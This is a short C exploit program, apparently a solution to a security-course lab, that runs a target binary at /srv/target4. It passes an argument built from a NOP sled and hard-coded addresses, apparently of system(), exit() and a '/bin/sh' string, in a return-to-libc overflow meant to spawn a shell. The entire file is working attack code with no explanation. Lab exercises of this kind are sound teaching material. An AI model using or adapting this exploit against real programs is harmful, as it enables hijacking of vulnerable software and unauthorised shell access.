#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

const char* TARGET = "/srv/target4";
const char* SLED = "\x90\x90\x90\x90\x90\x90\x90\x90";
const char* SYS = "\x60\x43\xe1\xf7";
const char* EX = "\xc0\x6e\xe0\xf7";
const char* SH = "\x63\xf3\xf5\xf7";

char* create_exploit_payload() {
    char* payload = malloc(strlen(SLED) + strlen(SYS) + strlen(EX) + strlen(SH) + 1);
    if (!payload) {
        perror("Failed to allocate payload");
        exit(EXIT_FAILURE);
    }
    sprintf(payload, "%s%s%s%s", SLED, SYS, EX, SH);
    return payload;
}

int main() {
    char *args[3] = {(char*)TARGET, create_exploit_payload(), NULL};
    char *env[1] = {NULL};

    if (execve(TARGET, args, env) == -1) {
        perror("execve failed");
    }

    free(args[1]);
    return 0;
}
